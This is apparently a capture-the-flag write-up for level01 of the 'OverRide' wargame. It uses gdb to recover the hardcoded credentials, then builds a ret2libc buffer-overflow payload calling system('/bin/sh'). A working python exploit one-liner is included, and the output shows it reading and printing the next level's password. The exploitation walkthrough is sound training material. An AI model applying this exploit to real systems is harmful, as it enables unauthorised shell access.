```
(gdb) b verify_user_pass
Breakpoint 1 at 0x80484a8
(gdb) b verify_user_name
Breakpoint 2 at 0x8048469
(gdb) b puts@plt
Breakpoint 3 at 0x8048380
```

run and continue to Breakpoint 3 (puts@plt)

```
(gdb) disass verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	push   %edi
   0x08048468 <+4>:	push   %esi
   0x08048469 <+5>:	sub    $0x10,%esp
   0x0804846c <+8>:	movl   $0x8048690,(%esp)
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    $0x804a040,%edx
   0x0804847d <+25>:	mov    $0x80486a8,%eax
   0x08048482 <+30>:	mov    $0x7,%ecx
   0x08048487 <+35>:	mov    %edx,%esi
   0x08048489 <+37>:	mov    %eax,%edi
   0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:	seta   %dl
   0x08048490 <+44>:	setb   %al
   0x08048493 <+47>:	mov    %edx,%ecx
   0x08048495 <+49>:	sub    %al,%cl
   0x08048497 <+51>:	mov    %ecx,%eax
   0x08048499 <+53>:	movsbl %al,%eax
   0x0804849c <+56>:	add    $0x10,%esp
   0x0804849f <+59>:	pop    %esi
   0x080484a0 <+60>:	pop    %edi
   0x080484a1 <+61>:	pop    %ebp
   0x080484a2 <+62>:	ret
```

let's watch what is copied at this addr 0x80486a8

```
End of assembler dump.
(gdb) x/30s 0x80486a8
0x80486a8:	 "dat_wil"
0x80486b0:	 "admin"
0x80486b6:	 ""
0x80486b7:	 ""
0x80486b8:	 "********* ADMIN LOGIN PROMPT *********"
0x80486df:	 "Enter Username: "
0x80486f0:	 "nope, incorrect username...\n"
0x804870d:	 "Enter Password: "
0x804871e:	 "nope, incorrect password...\n"
0x804873b:	 ""
0x804873c:	 "\001\033\003;@"
0x8048742:	 ""
0x8048743:	 ""
0x8048744:	 "\a"
0x8048746:	 ""
0x8048747:	 ""
0x8048748:	 "\024\374\377\377\\"
0x804874e:	 ""
0x804874f:	 ""
0x8048750:	 "(\375\377\377\200"
0x8048756:	 ""
0x8048757:	 ""
0x8048758:	 "g\375\377\377\250"
```

we can see login: dat_wil and password: admin

Here we manage to overwrite the EIP at offset 80. We cas then use a ret2libc exploit.

```
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

get addr of system addr: 0xf7e6aed0

```
(gdb) info proc map
process 1783
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	 0x804b000  0x806c000    0x21000        0x0 [heap]
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

get addr of all library C function so between 0xf7e2c000 and 0xf7fd0000

```
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

we find the /bin/sh addr 0xf7f897ec

```
(gdb) disass main
[...]
0x080485b5 <+229>:	ret
```

```
[...]
   0x08048565 <+149>:	movl   $0x64,0x4(%esp)
[...]
```

the row of password field is 100 chars

#### build exploit:

USERNAME + '\n'(next fgets) + 'A' * 80 + RETURN_MAIN_FUNCTION + SYSTEM_FUNCTION_ADDR + 4_CHARs + ADDR_OF_/bin/sh

#### result:

'dat_wil' + '\n' + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMP' + '\xec\x97\xf8\xf7'

80 + 4 + 4 + 4 + 4 = 100

```
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'A' * 4 + '\xec\x97\xf8\xf7'" > /tmp/level1
level01@OverRide:~$ cat /tmp/level1 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
^C
Segmentation fault (core dumped)
```
